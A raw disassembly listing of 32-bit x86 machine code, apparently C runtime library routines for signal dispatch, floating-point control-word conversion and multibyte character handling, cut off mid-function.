  406b5a:	83 fe 14             	cmp    $0x14,%esi
  406b5d:	7e 3b                	jle    0x406b9a
  406b5f:	83 fe 16             	cmp    $0x16,%esi
  406b62:	7f 36                	jg     0x406b9a
  406b64:	56                   	push   %esi
  406b65:	e8 e6 fe ff ff       	call   0x406a50
  406b6a:	83 c4 04             	add    $0x4,%esp
  406b6d:	eb 45                	jmp    0x406bb4
  406b6f:	e8 3a d8 ff ff       	call   0x4043ae
  406b74:	8b d8                	mov    %eax,%ebx
  406b76:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406b79:	85 db                	test   %ebx,%ebx
  406b7b:	75 08                	jne    0x406b85
  406b7d:	83 c8 ff             	or     $0xffffffff,%eax
  406b80:	e9 92 01 00 00       	jmp    0x406d17
  406b85:	ff 33                	push   (%ebx)
  406b87:	56                   	push   %esi
  406b88:	e8 05 ff ff ff       	call   0x406a92
  406b8d:	59                   	pop    %ecx
  406b8e:	59                   	pop    %ecx
  406b8f:	33 c9                	xor    %ecx,%ecx
  406b91:	85 c0                	test   %eax,%eax
  406b93:	0f 95 c1             	setne  %cl
  406b96:	85 c9                	test   %ecx,%ecx
  406b98:	75 12                	jne    0x406bac
  406b9a:	e8 9c dc ff ff       	call   0x40483b
  406b9f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  406ba5:	e8 99 da ff ff       	call   0x404643
  406baa:	eb d1                	jmp    0x406b7d
  406bac:	83 c0 08             	add    $0x8,%eax
  406baf:	32 c9                	xor    %cl,%cl
  406bb1:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  406bb4:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406bb7:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406bbb:	84 c9                	test   %cl,%cl
  406bbd:	74 0b                	je     0x406bca
  406bbf:	6a 03                	push   $0x3
  406bc1:	e8 9a ea ff ff       	call   0x405660
  406bc6:	59                   	pop    %ecx
  406bc7:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  406bca:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  406bce:	c6 45 e2 00          	movb   $0x0,-0x1e(%ebp)
  406bd2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406bd6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406bd9:	84 c9                	test   %cl,%cl
  406bdb:	74 14                	je     0x406bf1
  406bdd:	8b 15 04 30 41 00    	mov    0x413004,%edx
  406be3:	8b ca                	mov    %edx,%ecx
  406be5:	83 e1 1f             	and    $0x1f,%ecx
  406be8:	33 10                	xor    (%eax),%edx
  406bea:	d3 ca                	ror    %cl,%edx
  406bec:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  406bef:	eb 02                	jmp    0x406bf3
  406bf1:	8b 10                	mov    (%eax),%edx
  406bf3:	8b c2                	mov    %edx,%eax
  406bf5:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406bf8:	33 d2                	xor    %edx,%edx
  406bfa:	83 f8 01             	cmp    $0x1,%eax
  406bfd:	0f 94 c2             	sete   %dl
  406c00:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406c03:	88 55 e2             	mov    %dl,-0x1e(%ebp)
  406c06:	84 d2                	test   %dl,%dl
  406c08:	0f 85 8a 00 00 00    	jne    0x406c98
  406c0e:	85 c0                	test   %eax,%eax
  406c10:	75 13                	jne    0x406c25
  406c12:	84 c9                	test   %cl,%cl
  406c14:	74 08                	je     0x406c1e
  406c16:	6a 03                	push   $0x3
  406c18:	e8 8b ea ff ff       	call   0x4056a8
  406c1d:	59                   	pop    %ecx
  406c1e:	6a 03                	push   $0x3
  406c20:	e8 94 ca ff ff       	call   0x4036b9
  406c25:	3b f7                	cmp    %edi,%esi
  406c27:	74 0a                	je     0x406c33
  406c29:	83 fe 0b             	cmp    $0xb,%esi
  406c2c:	74 05                	je     0x406c33
  406c2e:	83 fe 04             	cmp    $0x4,%esi
  406c31:	75 23                	jne    0x406c56
  406c33:	8b 43 04             	mov    0x4(%ebx),%eax
  406c36:	89 45 d0             	mov    %eax,-0x30(%ebp)
  406c39:	83 63 04 00          	andl   $0x0,0x4(%ebx)
  406c3d:	3b f7                	cmp    %edi,%esi
  406c3f:	75 3b                	jne    0x406c7c
  406c41:	e8 c6 fe ff ff       	call   0x406b0c
  406c46:	8b 00                	mov    (%eax),%eax
  406c48:	89 45 cc             	mov    %eax,-0x34(%ebp)
  406c4b:	e8 bc fe ff ff       	call   0x406b0c
  406c50:	c7 00 8c 00 00 00    	movl   $0x8c,(%eax)
  406c56:	3b f7                	cmp    %edi,%esi
  406c58:	75 22                	jne    0x406c7c
  406c5a:	6b 05 c4 ca 40 00 0c 	imul   $0xc,0x40cac4,%eax
  406c61:	03 03                	add    (%ebx),%eax
  406c63:	6b 0d c8 ca 40 00 0c 	imul   $0xc,0x40cac8,%ecx
  406c6a:	03 c8                	add    %eax,%ecx
  406c6c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  406c6f:	3b c1                	cmp    %ecx,%eax
  406c71:	74 25                	je     0x406c98
  406c73:	83 60 08 00          	andl   $0x0,0x8(%eax)
  406c77:	83 c0 0c             	add    $0xc,%eax
  406c7a:	eb f0                	jmp    0x406c6c
  406c7c:	a1 04 30 41 00       	mov    0x413004,%eax
  406c81:	83 e0 1f             	and    $0x1f,%eax
  406c84:	6a 20                	push   $0x20
  406c86:	59                   	pop    %ecx
  406c87:	2b c8                	sub    %eax,%ecx
  406c89:	33 c0                	xor    %eax,%eax
  406c8b:	d3 c8                	ror    %cl,%eax
  406c8d:	33 05 04 30 41 00    	xor    0x413004,%eax
  406c93:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406c96:	89 01                	mov    %eax,(%ecx)
  406c98:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406c9f:	e8 31 00 00 00       	call   0x406cd5
  406ca4:	80 7d c8 00          	cmpb   $0x0,-0x38(%ebp)
  406ca8:	75 6b                	jne    0x406d15
  406caa:	3b f7                	cmp    %edi,%esi
  406cac:	75 36                	jne    0x406ce4
  406cae:	e8 77 d6 ff ff       	call   0x40432a
  406cb3:	ff 70 08             	push   0x8(%eax)
  406cb6:	57                   	push   %edi
  406cb7:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406cba:	ff 15 60 c1 40 00    	call   *0x40c160
  406cc0:	ff 55 dc             	call   *-0x24(%ebp)
  406cc3:	59                   	pop    %ecx
  406cc4:	eb 2b                	jmp    0x406cf1
  406cc6:	6a 08                	push   $0x8
  406cc8:	5f                   	pop    %edi
  406cc9:	8b 75 08             	mov    0x8(%ebp),%esi
  406ccc:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  406ccf:	8a 45 e2             	mov    -0x1e(%ebp),%al
  406cd2:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406cd5:	80 7d e3 00          	cmpb   $0x0,-0x1d(%ebp)
  406cd9:	74 08                	je     0x406ce3
  406cdb:	6a 03                	push   $0x3
  406cdd:	e8 c6 e9 ff ff       	call   0x4056a8
  406ce2:	59                   	pop    %ecx
  406ce3:	c3                   	ret
  406ce4:	56                   	push   %esi
  406ce5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406ce8:	ff 15 60 c1 40 00    	call   *0x40c160
  406cee:	ff 55 dc             	call   *-0x24(%ebp)
  406cf1:	59                   	pop    %ecx
  406cf2:	3b f7                	cmp    %edi,%esi
  406cf4:	74 0a                	je     0x406d00
  406cf6:	83 fe 0b             	cmp    $0xb,%esi
  406cf9:	74 05                	je     0x406d00
  406cfb:	83 fe 04             	cmp    $0x4,%esi
  406cfe:	75 15                	jne    0x406d15
  406d00:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406d03:	89 43 04             	mov    %eax,0x4(%ebx)
  406d06:	3b f7                	cmp    %edi,%esi
  406d08:	75 0b                	jne    0x406d15
  406d0a:	e8 1b d6 ff ff       	call   0x40432a
  406d0f:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  406d12:	89 48 08             	mov    %ecx,0x8(%eax)
  406d15:	33 c0                	xor    %eax,%eax
  406d17:	e8 dd 3d 00 00       	call   0x40aaf9
  406d1c:	c3                   	ret
  406d1d:	8b ff                	mov    %edi,%edi
  406d1f:	55                   	push   %ebp
  406d20:	8b ec                	mov    %esp,%ebp
  406d22:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d25:	33 c0                	xor    %eax,%eax
  406d27:	f6 c1 10             	test   $0x10,%cl
  406d2a:	74 05                	je     0x406d31
  406d2c:	b8 80 00 00 00       	mov    $0x80,%eax
  406d31:	53                   	push   %ebx
  406d32:	56                   	push   %esi
  406d33:	57                   	push   %edi
  406d34:	bf 00 02 00 00       	mov    $0x200,%edi
  406d39:	f6 c1 08             	test   $0x8,%cl
  406d3c:	74 02                	je     0x406d40
  406d3e:	0b c7                	or     %edi,%eax
  406d40:	f6 c1 04             	test   $0x4,%cl
  406d43:	74 05                	je     0x406d4a
  406d45:	0d 00 04 00 00       	or     $0x400,%eax
  406d4a:	f6 c1 02             	test   $0x2,%cl
  406d4d:	74 05                	je     0x406d54
  406d4f:	0d 00 08 00 00       	or     $0x800,%eax
  406d54:	f6 c1 01             	test   $0x1,%cl
  406d57:	74 05                	je     0x406d5e
  406d59:	0d 00 10 00 00       	or     $0x1000,%eax
  406d5e:	be 00 01 00 00       	mov    $0x100,%esi
  406d63:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  406d69:	74 02                	je     0x406d6d
  406d6b:	0b c6                	or     %esi,%eax
  406d6d:	8b d1                	mov    %ecx,%edx
  406d6f:	bb 00 03 00 00       	mov    $0x300,%ebx
  406d74:	23 d3                	and    %ebx,%edx
  406d76:	74 1f                	je     0x406d97
  406d78:	3b d6                	cmp    %esi,%edx
  406d7a:	74 16                	je     0x406d92
  406d7c:	3b d7                	cmp    %edi,%edx
  406d7e:	74 0b                	je     0x406d8b
  406d80:	3b d3                	cmp    %ebx,%edx
  406d82:	75 13                	jne    0x406d97
  406d84:	0d 00 60 00 00       	or     $0x6000,%eax
  406d89:	eb 0c                	jmp    0x406d97
  406d8b:	0d 00 40 00 00       	or     $0x4000,%eax
  406d90:	eb 05                	jmp    0x406d97
  406d92:	0d 00 20 00 00       	or     $0x2000,%eax
  406d97:	ba 00 00 00 03       	mov    $0x3000000,%edx
  406d9c:	5f                   	pop    %edi
  406d9d:	23 ca                	and    %edx,%ecx
  406d9f:	5e                   	pop    %esi
  406da0:	5b                   	pop    %ebx
  406da1:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  406da7:	74 18                	je     0x406dc1
  406da9:	81 f9 00 00 00 02    	cmp    $0x2000000,%ecx
  406daf:	74 0b                	je     0x406dbc
  406db1:	3b ca                	cmp    %edx,%ecx
  406db3:	75 11                	jne    0x406dc6
  406db5:	0d 00 80 00 00       	or     $0x8000,%eax
  406dba:	5d                   	pop    %ebp
  406dbb:	c3                   	ret
  406dbc:	83 c8 40             	or     $0x40,%eax
  406dbf:	5d                   	pop    %ebp
  406dc0:	c3                   	ret
  406dc1:	0d 40 80 00 00       	or     $0x8040,%eax
  406dc6:	5d                   	pop    %ebp
  406dc7:	c3                   	ret
  406dc8:	8b ff                	mov    %edi,%edi
  406dca:	55                   	push   %ebp
  406dcb:	8b ec                	mov    %esp,%ebp
  406dcd:	83 ec 10             	sub    $0x10,%esp
  406dd0:	9b d9 7d f8          	fstcw  -0x8(%ebp)
  406dd4:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  406dd8:	33 c9                	xor    %ecx,%ecx
  406dda:	a8 01                	test   $0x1,%al
  406ddc:	74 03                	je     0x406de1
  406dde:	6a 10                	push   $0x10
  406de0:	59                   	pop    %ecx
  406de1:	a8 04                	test   $0x4,%al
  406de3:	74 03                	je     0x406de8
  406de5:	83 c9 08             	or     $0x8,%ecx
  406de8:	a8 08                	test   $0x8,%al
  406dea:	74 03                	je     0x406def
  406dec:	83 c9 04             	or     $0x4,%ecx
  406def:	a8 10                	test   $0x10,%al
  406df1:	74 03                	je     0x406df6
  406df3:	83 c9 02             	or     $0x2,%ecx
  406df6:	a8 20                	test   $0x20,%al
  406df8:	74 03                	je     0x406dfd
  406dfa:	83 c9 01             	or     $0x1,%ecx
  406dfd:	a8 02                	test   $0x2,%al
  406dff:	74 06                	je     0x406e07
  406e01:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  406e07:	53                   	push   %ebx
  406e08:	56                   	push   %esi
  406e09:	0f b7 f0             	movzwl %ax,%esi
  406e0c:	bb 00 0c 00 00       	mov    $0xc00,%ebx
  406e11:	8b d6                	mov    %esi,%edx
  406e13:	57                   	push   %edi
  406e14:	bf 00 02 00 00       	mov    $0x200,%edi
  406e19:	23 d3                	and    %ebx,%edx
  406e1b:	74 26                	je     0x406e43
  406e1d:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  406e23:	74 18                	je     0x406e3d
  406e25:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406e2b:	74 0c                	je     0x406e39
  406e2d:	3b d3                	cmp    %ebx,%edx
  406e2f:	75 12                	jne    0x406e43
  406e31:	81 c9 00 03 00 00    	or     $0x300,%ecx
  406e37:	eb 0a                	jmp    0x406e43
  406e39:	0b cf                	or     %edi,%ecx
  406e3b:	eb 06                	jmp    0x406e43
  406e3d:	81 c9 00 01 00 00    	or     $0x100,%ecx
  406e43:	81 e6 00 03 00 00    	and    $0x300,%esi
  406e49:	74 0c                	je     0x406e57
  406e4b:	3b f7                	cmp    %edi,%esi
  406e4d:	75 0e                	jne    0x406e5d
  406e4f:	81 c9 00 00 01 00    	or     $0x10000,%ecx
  406e55:	eb 06                	jmp    0x406e5d
  406e57:	81 c9 00 00 02 00    	or     $0x20000,%ecx
  406e5d:	ba 00 10 00 00       	mov    $0x1000,%edx
  406e62:	66 85 c2             	test   %ax,%dx
  406e65:	74 06                	je     0x406e6d
  406e67:	81 c9 00 00 04 00    	or     $0x40000,%ecx
  406e6d:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406e70:	8b f7                	mov    %edi,%esi
  406e72:	8b 45 08             	mov    0x8(%ebp),%eax
  406e75:	f7 d6                	not    %esi
  406e77:	23 f1                	and    %ecx,%esi
  406e79:	23 c7                	and    %edi,%eax
  406e7b:	0b f0                	or     %eax,%esi
  406e7d:	3b f1                	cmp    %ecx,%esi
  406e7f:	0f 84 a6 00 00 00    	je     0x406f2b
  406e85:	56                   	push   %esi
  406e86:	e8 3f 02 00 00       	call   0x4070ca
  406e8b:	59                   	pop    %ecx
  406e8c:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  406e90:	d9 6d fc             	fldcw  -0x4(%ebp)
  406e93:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  406e97:	66 8b 45 fc          	mov    -0x4(%ebp),%ax
  406e9b:	33 f6                	xor    %esi,%esi
  406e9d:	a8 01                	test   $0x1,%al
  406e9f:	74 03                	je     0x406ea4
  406ea1:	6a 10                	push   $0x10
  406ea3:	5e                   	pop    %esi
  406ea4:	a8 04                	test   $0x4,%al
  406ea6:	74 03                	je     0x406eab
  406ea8:	83 ce 08             	or     $0x8,%esi
  406eab:	a8 08                	test   $0x8,%al
  406ead:	74 03                	je     0x406eb2
  406eaf:	83 ce 04             	or     $0x4,%esi
  406eb2:	a8 10                	test   $0x10,%al
  406eb4:	74 03                	je     0x406eb9
  406eb6:	83 ce 02             	or     $0x2,%esi
  406eb9:	a8 20                	test   $0x20,%al
  406ebb:	74 03                	je     0x406ec0
  406ebd:	83 ce 01             	or     $0x1,%esi
  406ec0:	a8 02                	test   $0x2,%al
  406ec2:	74 06                	je     0x406eca
  406ec4:	81 ce 00 00 08 00    	or     $0x80000,%esi
  406eca:	0f b7 d0             	movzwl %ax,%edx
  406ecd:	8b ca                	mov    %edx,%ecx
  406ecf:	23 cb                	and    %ebx,%ecx
  406ed1:	74 2a                	je     0x406efd
  406ed3:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  406ed9:	74 1c                	je     0x406ef7
  406edb:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406ee1:	74 0c                	je     0x406eef
  406ee3:	3b cb                	cmp    %ebx,%ecx
  406ee5:	75 16                	jne    0x406efd
  406ee7:	81 ce 00 03 00 00    	or     $0x300,%esi
  406eed:	eb 0e                	jmp    0x406efd
  406eef:	81 ce 00 02 00 00    	or     $0x200,%esi
  406ef5:	eb 06                	jmp    0x406efd
  406ef7:	81 ce 00 01 00 00    	or     $0x100,%esi
  406efd:	81 e2 00 03 00 00    	and    $0x300,%edx
  406f03:	74 10                	je     0x406f15
  406f05:	81 fa 00 02 00 00    	cmp    $0x200,%edx
  406f0b:	75 0e                	jne    0x406f1b
  406f0d:	81 ce 00 00 01 00    	or     $0x10000,%esi
  406f13:	eb 06                	jmp    0x406f1b
  406f15:	81 ce 00 00 02 00    	or     $0x20000,%esi
  406f1b:	ba 00 10 00 00       	mov    $0x1000,%edx
  406f20:	66 85 c2             	test   %ax,%dx
  406f23:	74 06                	je     0x406f2b
  406f25:	81 ce 00 00 04 00    	or     $0x40000,%esi
  406f2b:	83 3d dc 3a 41 00 01 	cmpl   $0x1,0x413adc
  406f32:	0f 8c 89 01 00 00    	jl     0x4070c1
  406f38:	81 e7 1f 03 08 03    	and    $0x308031f,%edi
  406f3e:	0f ae 5d f0          	stmxcsr -0x10(%ebp)
  406f42:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406f45:	33 c9                	xor    %ecx,%ecx
  406f47:	84 c0                	test   %al,%al
  406f49:	79 03                	jns    0x406f4e
  406f4b:	6a 10                	push   $0x10
  406f4d:	59                   	pop    %ecx
  406f4e:	a9 00 02 00 00       	test   $0x200,%eax
  406f53:	74 03                	je     0x406f58
  406f55:	83 c9 08             	or     $0x8,%ecx
  406f58:	a9 00 04 00 00       	test   $0x400,%eax
  406f5d:	74 03                	je     0x406f62
  406f5f:	83 c9 04             	or     $0x4,%ecx
  406f62:	a9 00 08 00 00       	test   $0x800,%eax
  406f67:	74 03                	je     0x406f6c
  406f69:	83 c9 02             	or     $0x2,%ecx
  406f6c:	85 c2                	test   %eax,%edx
  406f6e:	74 03                	je     0x406f73
  406f70:	83 c9 01             	or     $0x1,%ecx
  406f73:	a9 00 01 00 00       	test   $0x100,%eax
  406f78:	74 06                	je     0x406f80
  406f7a:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  406f80:	8b d0                	mov    %eax,%edx
  406f82:	bb 00 60 00 00       	mov    $0x6000,%ebx
  406f87:	23 d3                	and    %ebx,%edx
  406f89:	74 2a                	je     0x406fb5
  406f8b:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  406f91:	74 1c                	je     0x406faf
  406f93:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  406f99:	74 0c                	je     0x406fa7
  406f9b:	3b d3                	cmp    %ebx,%edx
  406f9d:	75 16                	jne    0x406fb5
  406f9f:	81 c9 00 03 00 00    	or     $0x300,%ecx
  406fa5:	eb 0e                	jmp    0x406fb5
  406fa7:	81 c9 00 02 00 00    	or     $0x200,%ecx
  406fad:	eb 06                	jmp    0x406fb5
  406faf:	81 c9 00 01 00 00    	or     $0x100,%ecx
  406fb5:	6a 40                	push   $0x40
  406fb7:	25 40 80 00 00       	and    $0x8040,%eax
  406fbc:	5b                   	pop    %ebx
  406fbd:	2b c3                	sub    %ebx,%eax
  406fbf:	74 1b                	je     0x406fdc
  406fc1:	2d c0 7f 00 00       	sub    $0x7fc0,%eax
  406fc6:	74 0c                	je     0x406fd4
  406fc8:	2b c3                	sub    %ebx,%eax
  406fca:	75 16                	jne    0x406fe2
  406fcc:	81 c9 00 00 00 01    	or     $0x1000000,%ecx
  406fd2:	eb 0e                	jmp    0x406fe2
  406fd4:	81 c9 00 00 00 03    	or     $0x3000000,%ecx
  406fda:	eb 06                	jmp    0x406fe2
  406fdc:	81 c9 00 00 00 02    	or     $0x2000000,%ecx
  406fe2:	8b c7                	mov    %edi,%eax
  406fe4:	23 7d 08             	and    0x8(%ebp),%edi
  406fe7:	f7 d0                	not    %eax
  406fe9:	23 c1                	and    %ecx,%eax
  406feb:	0b c7                	or     %edi,%eax
  406fed:	3b c1                	cmp    %ecx,%eax
  406fef:	0f 84 b5 00 00 00    	je     0x4070aa
  406ff5:	50                   	push   %eax
  406ff6:	e8 22 fd ff ff       	call   0x406d1d
  406ffb:	50                   	push   %eax
  406ffc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406fff:	e8 db 0e 00 00       	call   0x407edf
  407004:	59                   	pop    %ecx
  407005:	59                   	pop    %ecx
  407006:	0f ae 5d f4          	stmxcsr -0xc(%ebp)
  40700a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40700d:	33 c9                	xor    %ecx,%ecx
  40700f:	84 c0                	test   %al,%al
  407011:	79 03                	jns    0x407016
  407013:	6a 10                	push   $0x10
  407015:	59                   	pop    %ecx
  407016:	a9 00 02 00 00       	test   $0x200,%eax
  40701b:	74 03                	je     0x407020
  40701d:	83 c9 08             	or     $0x8,%ecx
  407020:	a9 00 04 00 00       	test   $0x400,%eax
  407025:	74 03                	je     0x40702a
  407027:	83 c9 04             	or     $0x4,%ecx
  40702a:	a9 00 08 00 00       	test   $0x800,%eax
  40702f:	74 03                	je     0x407034
  407031:	83 c9 02             	or     $0x2,%ecx
  407034:	a9 00 10 00 00       	test   $0x1000,%eax
  407039:	74 03                	je     0x40703e
  40703b:	83 c9 01             	or     $0x1,%ecx
  40703e:	a9 00 01 00 00       	test   $0x100,%eax
  407043:	74 06                	je     0x40704b
  407045:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  40704b:	8b d0                	mov    %eax,%edx
  40704d:	bf 00 60 00 00       	mov    $0x6000,%edi
  407052:	23 d7                	and    %edi,%edx
  407054:	74 2a                	je     0x407080
  407056:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  40705c:	74 1c                	je     0x40707a
  40705e:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  407064:	74 0c                	je     0x407072
  407066:	3b d7                	cmp    %edi,%edx
  407068:	75 16                	jne    0x407080
  40706a:	81 c9 00 03 00 00    	or     $0x300,%ecx
  407070:	eb 0e                	jmp    0x407080
  407072:	81 c9 00 02 00 00    	or     $0x200,%ecx
  407078:	eb 06                	jmp    0x407080
  40707a:	81 c9 00 01 00 00    	or     $0x100,%ecx
  407080:	25 40 80 00 00       	and    $0x8040,%eax
  407085:	2b c3                	sub    %ebx,%eax
  407087:	74 1b                	je     0x4070a4
  407089:	2d c0 7f 00 00       	sub    $0x7fc0,%eax
  40708e:	74 0c                	je     0x40709c
  407090:	2b c3                	sub    %ebx,%eax
  407092:	75 16                	jne    0x4070aa
  407094:	81 c9 00 00 00 01    	or     $0x1000000,%ecx
  40709a:	eb 0e                	jmp    0x4070aa
  40709c:	81 c9 00 00 00 03    	or     $0x3000000,%ecx
  4070a2:	eb 06                	jmp    0x4070aa
  4070a4:	81 c9 00 00 00 02    	or     $0x2000000,%ecx
  4070aa:	8b c1                	mov    %ecx,%eax
  4070ac:	0b ce                	or     %esi,%ecx
  4070ae:	33 c6                	xor    %esi,%eax
  4070b0:	a9 1f 03 08 00       	test   $0x8031f,%eax
  4070b5:	74 06                	je     0x4070bd
  4070b7:	81 c9 00 00 00 80    	or     $0x80000000,%ecx
  4070bd:	8b c1                	mov    %ecx,%eax
  4070bf:	eb 02                	jmp    0x4070c3
  4070c1:	8b c6                	mov    %esi,%eax
  4070c3:	5f                   	pop    %edi
  4070c4:	5e                   	pop    %esi
  4070c5:	5b                   	pop    %ebx
  4070c6:	8b e5                	mov    %ebp,%esp
  4070c8:	5d                   	pop    %ebp
  4070c9:	c3                   	ret
  4070ca:	8b ff                	mov    %edi,%edi
  4070cc:	55                   	push   %ebp
  4070cd:	8b ec                	mov    %esp,%ebp
  4070cf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4070d2:	33 c0                	xor    %eax,%eax
  4070d4:	f6 c1 10             	test   $0x10,%cl
  4070d7:	74 01                	je     0x4070da
  4070d9:	40                   	inc    %eax
  4070da:	f6 c1 08             	test   $0x8,%cl
  4070dd:	74 03                	je     0x4070e2
  4070df:	83 c8 04             	or     $0x4,%eax
  4070e2:	f6 c1 04             	test   $0x4,%cl
  4070e5:	74 03                	je     0x4070ea
  4070e7:	83 c8 08             	or     $0x8,%eax
  4070ea:	f6 c1 02             	test   $0x2,%cl
  4070ed:	74 03                	je     0x4070f2
  4070ef:	83 c8 10             	or     $0x10,%eax
  4070f2:	f6 c1 01             	test   $0x1,%cl
  4070f5:	74 03                	je     0x4070fa
  4070f7:	83 c8 20             	or     $0x20,%eax
  4070fa:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  407100:	74 03                	je     0x407105
  407102:	83 c8 02             	or     $0x2,%eax
  407105:	56                   	push   %esi
  407106:	8b d1                	mov    %ecx,%edx
  407108:	be 00 03 00 00       	mov    $0x300,%esi
  40710d:	57                   	push   %edi
  40710e:	bf 00 02 00 00       	mov    $0x200,%edi
  407113:	23 d6                	and    %esi,%edx
  407115:	74 23                	je     0x40713a
  407117:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40711d:	74 16                	je     0x407135
  40711f:	3b d7                	cmp    %edi,%edx
  407121:	74 0b                	je     0x40712e
  407123:	3b d6                	cmp    %esi,%edx
  407125:	75 13                	jne    0x40713a
  407127:	0d 00 0c 00 00       	or     $0xc00,%eax
  40712c:	eb 0c                	jmp    0x40713a
  40712e:	0d 00 08 00 00       	or     $0x800,%eax
  407133:	eb 05                	jmp    0x40713a
  407135:	0d 00 04 00 00       	or     $0x400,%eax
  40713a:	8b d1                	mov    %ecx,%edx
  40713c:	81 e2 00 00 03 00    	and    $0x30000,%edx
  407142:	74 0c                	je     0x407150
  407144:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  40714a:	75 06                	jne    0x407152
  40714c:	0b c7                	or     %edi,%eax
  40714e:	eb 02                	jmp    0x407152
  407150:	0b c6                	or     %esi,%eax
  407152:	5f                   	pop    %edi
  407153:	5e                   	pop    %esi
  407154:	f7 c1 00 00 04 00    	test   $0x40000,%ecx
  40715a:	74 05                	je     0x407161
  40715c:	0d 00 10 00 00       	or     $0x1000,%eax
  407161:	5d                   	pop    %ebp
  407162:	c3                   	ret
  407163:	8b ff                	mov    %edi,%edi
  407165:	55                   	push   %ebp
  407166:	8b ec                	mov    %esp,%ebp
  407168:	83 ec 10             	sub    $0x10,%esp
  40716b:	53                   	push   %ebx
  40716c:	56                   	push   %esi
  40716d:	8b 75 0c             	mov    0xc(%ebp),%esi
  407170:	85 f6                	test   %esi,%esi
  407172:	74 18                	je     0x40718c
  407174:	8b 5d 10             	mov    0x10(%ebp),%ebx
  407177:	85 db                	test   %ebx,%ebx
  407179:	74 11                	je     0x40718c
  40717b:	80 3e 00             	cmpb   $0x0,(%esi)
  40717e:	75 14                	jne    0x407194
  407180:	8b 45 08             	mov    0x8(%ebp),%eax
  407183:	85 c0                	test   %eax,%eax
  407185:	74 05                	je     0x40718c
  407187:	33 c9                	xor    %ecx,%ecx
  407189:	66 89 08             	mov    %cx,(%eax)
  40718c:	33 c0                	xor    %eax,%eax
  40718e:	5e                   	pop    %esi
  40718f:	5b                   	pop    %ebx
  407190:	8b e5                	mov    %ebp,%esp
  407192:	5d                   	pop    %ebp
  407193:	c3                   	ret
  407194:	57                   	push   %edi
  407195:	ff 75 14             	push   0x14(%ebp)
  407198:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40719b:	e8 95 cd ff ff       	call   0x403f35
  4071a0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4071a3:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  4071aa:	75 15                	jne    0x4071c1
  4071ac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4071af:	85 c9                	test   %ecx,%ecx
  4071b1:	74 06                	je     0x4071b9
  4071b3:	0f b6 06             	movzbl (%esi),%eax
  4071b6:	66 89 01             	mov    %ax,(%ecx)
  4071b9:	33 ff                	xor    %edi,%edi
  4071bb:	47                   	inc    %edi
  4071bc:	e9 84 00 00 00       	jmp    0x407245
  4071c1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4071c4:	50                   	push   %eax
  4071c5:	0f b6 06             	movzbl (%esi),%eax
  4071c8:	50                   	push   %eax
  4071c9:	e8 33 0e 00 00       	call   0x408001
  4071ce:	59                   	pop    %ecx
  4071cf:	59                   	pop    %ecx
  4071d0:	85 c0                	test   %eax,%eax
  4071d2:	74 40                	je     0x407214
  4071d4:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4071d7:	83 7f 04 01          	cmpl   $0x1,0x4(%edi)
  4071db:	7e 27                	jle    0x407204
  4071dd:	3b 5f 04             	cmp    0x4(%edi),%ebx
  4071e0:	7c 25                	jl     0x407207
  4071e2:	33 c0                	xor    %eax,%eax
  4071e4:	39 45 08             	cmp    %eax,0x8(%ebp)
  4071e7:	0f 95 c0             	setne  %al
  4071ea:	50                   	push   %eax
  4071eb:	ff 75 08             	push   0x8(%ebp)
  4071ee:	ff 77 04             	push   0x4(%edi)
  4071f1:	56                   	push   %esi
  4071f2:	6a 09                	push   $0x9
  4071f4:	ff 77 08             	push   0x8(%edi)
  4071f7:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  4071fd:	8b 7d f4             	mov    -0xc(%ebp),%edi
  407200:	85 c0                	test   %eax,%eax
  407202:	75 0b                	jne    0x40720f
  407204:	3b 5f 04             	cmp    0x4(%edi),%ebx
  407207:	72 2e                	jb     0x407237
  407209:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  40720d:	74 28                	je     0x407237
